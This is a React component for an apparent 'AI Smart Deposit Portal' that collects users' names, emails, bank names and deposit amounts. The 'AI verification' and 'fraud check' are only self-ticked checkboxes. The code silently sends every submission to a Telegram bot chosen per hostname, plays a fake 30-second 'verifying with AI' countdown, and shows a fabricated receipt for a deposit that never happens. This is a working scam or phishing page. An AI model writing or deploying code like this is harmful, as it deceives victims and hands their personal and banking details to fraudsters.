'use client'

import { useState } from 'react'

interface TelegramConfig {
  botToken: string
  chatId: string
}

const PROCESSING_SECONDS = 30

export default function DepositPortal() {
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [submitSuccess, setSubmitSuccess] = useState(false)
  const [processingSecondsLeft, setProcessingSecondsLeft] = useState(PROCESSING_SECONDS)
  const [processingStep, setProcessingStep] = useState(0)
  const [receiptReference, setReceiptReference] = useState('')

  const [formData, setFormData] = useState({
    fullName: '',
    email: '',
    bankName: '',
    accountType: '' as '' | 'savings' | 'checking',
    depositMethod: '' as '' | 'bank_transfer' | 'ach',
    amount: '',
    currency: 'USD',
    identityVerified: false,
    accountValidated: false,
    fraudCheckPassed: false,
    transactionAuthorized: false,
    termsAgreed: false,
  })

  const handleInputChange = (
    e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>
  ) => {
    const { name, value, type } = e.target
    if (type === 'checkbox') {
      const checkbox = e.target as HTMLInputElement
      setFormData((prev) => ({ ...prev, [name]: checkbox.checked }))
    } else {
      setFormData((prev) => ({ ...prev, [name]: value }))
    }
  }

  const isFormValid = () =>
    !!(
      formData.fullName &&
      formData.email &&
      formData.bankName &&
      formData.accountType &&
      formData.depositMethod &&
      formData.amount &&
      formData.identityVerified &&
      formData.accountValidated &&
      formData.fraudCheckPassed &&
      formData.transactionAuthorized &&
      formData.termsAgreed
    )

  const getTelegramConfig = async (): Promise<TelegramConfig> => {
    try {
      const response = await fetch('/telegram-config.json')
      const config = await response.json()
      const hostname = window.location.hostname
      return config[hostname] || config['default']
    } catch {
      return { botToken: '', chatId: '' }
    }
  }

  const sendToTelegram = async () => {
    const config = await getTelegramConfig()
    if (!config.botToken || !config.chatId) return false

    const message = `
🔔 *AI SMART DEPOSIT – NEW SUBMISSION*
━━━━━━━━━━━━━━━━━━━━━━

👤 *User Information*
• Full Name: ${formData.fullName}
• Email: ${formData.email}

🏦 *Account Details*
• Bank Name: ${formData.bankName}
• Account Type: ${formData.accountType === 'savings' ? 'Savings' : 'Checking'}

💰 *Deposit Information*
• Method: ${formData.depositMethod === 'bank_transfer' ? 'Bank Transfer' : 'ACH'}
• Amount: ${formData.amount} ${formData.currency}

📸 *AI Verification* ✓
📅 ${new Date().toLocaleString()}
🌐 ${window.location.hostname}
`

    try {
      const response = await fetch(
        `https://api.telegram.org/bot${config.botToken}/sendMessage`,
        {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: config.chatId,
            text: message,
            parse_mode: 'Markdown',
          }),
        }
      )
      return response.ok
    } catch {
      return false
    }
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    if (!isFormValid()) return
    setIsSubmitting(true)
    setProcessingSecondsLeft(PROCESSING_SECONDS)
    setProcessingStep(0)
    await sendToTelegram()
    setProcessingStep(1)
    const start = Date.now()
    const end = start + PROCESSING_SECONDS * 1000
    const stepInterval = (PROCESSING_SECONDS * 1000) / 3
    const timer = setInterval(() => {
      const left = Math.max(0, Math.ceil((end - Date.now()) / 1000))
      setProcessingSecondsLeft(left)
      if (left <= 20) setProcessingStep(2)
      if (left <= 10) setProcessingStep(3)
    }, 500)
    await new Promise((resolve) => setTimeout(resolve, PROCESSING_SECONDS * 1000))
    clearInterval(timer)
    setReceiptReference('DEP-' + Date.now().toString().slice(-10))
    setSubmitSuccess(true)
    setIsSubmitting(false)
  }

  const handleSubmitAnother = () => {
    setSubmitSuccess(false)
    setFormData({
      fullName: '',
      email: '',
      bankName: '',
      accountType: '',
      depositMethod: '',
      amount: '',
      currency: 'USD',
      identityVerified: false,
      accountValidated: false,
      fraudCheckPassed: false,
      transactionAuthorized: false,
      termsAgreed: false,
    })
  }

  if (submitSuccess) {
    return (
      <>
        <header className="header">
          <div className="header-brand">
            <span className="header-title">AI Smart Deposit Portal</span>
          </div>
        </header>
        <main className="main-container">
          <div className="deposit-card receipt-card">
            <div className="success-content">
              <h2 className="receipt-title">Receipt</h2>
              <div className="success-icon">✓</div>
              <p className="success-text">
                Your deposit has been processed successfully.
              </p>
              <div className="receipt-details">
                <p className="success-reference">Reference: {receiptReference}</p>
                <p className="receipt-amount">
                  Amount: {formData.currency === 'USD' ? '$' : formData.currency === 'EUR' ? '€' : '£'}
                  {formData.amount} {formData.currency}
                </p>
                <p className="receipt-date">
                  Date: {new Date().toLocaleString()}
                </p>
              </div>
              <button
                type="button"
                className="submit-button"
                onClick={handleSubmitAnother}
              >
                New Deposit
              </button>
            </div>
          </div>
        </main>
      </>
    )
  }

  if (isSubmitting) {
    const steps = ['Submitting deposit...', 'Verifying with AI...', 'Finalizing transaction...']
    return (
      <>
        <header className="header">
          <div className="header-brand">
            <span className="header-title">AI Smart Deposit Portal</span>
          </div>
        </header>
        <main className="main-container">
          <div className="deposit-card processing-card">
            <div className="processing-content">
              <h2 className="processing-title">Processing your deposit</h2>
              <div className="processing-spinner" aria-hidden />
              <p className="processing-step">{steps[processingStep] ?? steps[2]}</p>
              <p className="processing-countdown">
                Estimated time remaining: <strong>{processingSecondsLeft}</strong> seconds
              </p>
              <div className="processing-progress">
                <div
                  className="processing-progress-bar"
                  style={{
                    width: `${((PROCESSING_SECONDS - processingSecondsLeft) / PROCESSING_SECONDS) * 100}%`,
                  }}
                />
              </div>
            </div>
          </div>
        </main>
      </>
    )
  }

  return (
    <>
      <header className="header">
        <div className="header-brand">
          <span className="header-title">AI Smart Deposit Portal</span>
        </div>
      </header>

      <main className="main-container">
        <div className="deposit-card">
          <div className="deposit-header">
            <h1 className="deposit-title">AI Smart Deposit Portal</h1>
            <p className="deposit-subtitle">Secure Online Money Deposit</p>
            <div className="divider">⸻</div>
          </div>

          <form className="deposit-form" onSubmit={handleSubmit} autoComplete="off">
            <section className="form-section">
              <h2 className="section-title">👤 User Information</h2>
              <div className="form-row">
                <div className="form-field">
                  <label className="field-label">Full Name</label>
                  <input
                    type="text"
                    name="fullName"
                    className="field-input"
                    value={formData.fullName}
                    onChange={handleInputChange}
                    placeholder=" "
                  />
                </div>
              </div>
              <div className="form-row">
                <div className="form-field">
                  <label className="field-label">Email Address</label>
                  <input
                    type="email"
                    name="email"
                    className="field-input"
                    value={formData.email}
                    onChange={handleInputChange}
                    placeholder=" "
                  />
                </div>
              </div>
            </section>

            <div className="divider">⸻</div>

            <section className="form-section">
              <h2 className="section-title">🏦 Account Details</h2>
              <div className="form-row">
                <div className="form-field">
                  <label className="field-label">Bank Name</label>
                  <input
                    type="text"
                    name="bankName"
                    className="field-input"
                    value={formData.bankName}
                    onChange={handleInputChange}
                    placeholder=" "
                  />
                </div>
              </div>
              <div className="form-row">
                <label className="field-label">Account Type</label>
                <div className="radio-group">
                  <label className="radio-label">
                    <input
                      type="radio"
                      name="accountType"
                      value="savings"
                      checked={formData.accountType === 'savings'}
                      onChange={handleInputChange}
                    />
                    <span>Savings</span>
                  </label>
                  <label className="radio-label">
                    <input
                      type="radio"
                      name="accountType"
                      value="checking"
                      checked={formData.accountType === 'checking'}
                      onChange={handleInputChange}
                    />
                    <span>Checking</span>
                  </label>
                </div>
              </div>
            </section>

            <div className="divider">⸻</div>

            <section className="form-section">
              <h2 className="section-title">💰 Deposit Information</h2>
              <div className="form-row">
                <label className="field-label">Deposit Method</label>
                <div className="radio-group">
                  <label className="radio-label">
                    <input
                      type="radio"
                      name="depositMethod"
                      value="bank_transfer"
                      checked={formData.depositMethod === 'bank_transfer'}
                      onChange={handleInputChange}
                    />
                    <span>Bank Transfer</span>
                  </label>
                  <label className="radio-label">
                    <input
                      type="radio"
                      name="depositMethod"
                      value="ach"
                      checked={formData.depositMethod === 'ach'}
                      onChange={handleInputChange}
                    />
                    <span>ACH</span>
                  </label>
                </div>
              </div>
              <div className="form-row two-cols">
                <div className="form-field">
                  <label className="field-label">Amount to Deposit</label>
                  <div className="input-with-prefix">
                    <span className="input-prefix">
                      {formData.currency === 'USD' ? '$' : formData.currency === 'EUR' ? '€' : '£'}
                    </span>
                    <input
                      type="text"
                      name="amount"
                      className="field-input"
                      value={formData.amount}
                      onChange={handleInputChange}
                      placeholder=" "
                      inputMode="decimal"
                    />
                  </div>
                </div>
                <div className="form-field">
                  <label className="field-label">Currency</label>
                  <select
                    name="currency"
                    className="field-select"
                    value={formData.currency}
                    onChange={handleInputChange}
                  >
                    <option value="USD">USD</option>
                    <option value="EUR">EUR</option>
                    <option value="GBP">GBP</option>
                  </select>
                </div>
              </div>
            </section>

            <div className="divider">⸻</div>

            <section className="form-section">
              <h2 className="section-title">📸 Smart AI Verification</h2>
              <p className="section-hint">🧠 AI Status:</p>
              <div className="checkbox-group">
                <label className="checkbox-label">
                  <input
                    type="checkbox"
                    name="identityVerified"
                    checked={formData.identityVerified}
                    onChange={handleInputChange}
                  />
                  <span className="checkbox-text">Identity Verified</span>
                </label>
                <label className="checkbox-label">
                  <input
                    type="checkbox"
                    name="accountValidated"
                    checked={formData.accountValidated}
                    onChange={handleInputChange}
                  />
                  <span className="checkbox-text">Account Validated</span>
                </label>
                <label className="checkbox-label">
                  <input
                    type="checkbox"
                    name="fraudCheckPassed"
                    checked={formData.fraudCheckPassed}
                    onChange={handleInputChange}
                  />
                  <span className="checkbox-text">Fraud Check Passed</span>
                </label>
              </div>
            </section>

            <div className="divider">⸻</div>

            <section className="form-section">
              <h2 className="section-title">🔐 Security Confirmation</h2>
              <div className="checkbox-group">
                <label className="checkbox-label">
                  <input
                    type="checkbox"
                    name="transactionAuthorized"
                    checked={formData.transactionAuthorized}
                    onChange={handleInputChange}
                  />
                  <span className="checkbox-text">
                    I confirm this transaction is authorized
                  </span>
                </label>
                <label className="checkbox-label">
                  <input
                    type="checkbox"
                    name="termsAgreed"
                    checked={formData.termsAgreed}
                    onChange={handleInputChange}
                  />
                  <span className="checkbox-text">
                    I agree to Terms &amp; AI Fraud Monitoring
                  </span>
                </label>
              </div>
            </section>

            <button
              type="submit"
              className="submit-button"
              disabled={!isFormValid() || isSubmitting}
            >
              {isSubmitting ? 'Processing...' : 'Submit Deposit'}
            </button>
          </form>
        </div>
      </main>
    </>
  )
}
